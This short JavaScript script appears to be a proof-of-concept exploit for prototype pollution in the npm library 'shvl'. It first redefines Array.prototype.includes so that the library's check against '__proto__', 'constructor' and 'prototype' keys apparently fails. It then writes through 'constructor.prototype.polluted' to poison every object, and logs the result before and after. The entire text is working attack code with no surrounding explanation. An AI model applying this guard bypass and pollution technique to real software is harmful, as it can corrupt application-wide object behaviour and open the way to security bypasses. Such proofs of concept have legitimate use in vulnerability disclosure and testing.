Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
var shvl = require('shvl');
obj = {};
console.log({}.polluted);
shvl.set(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);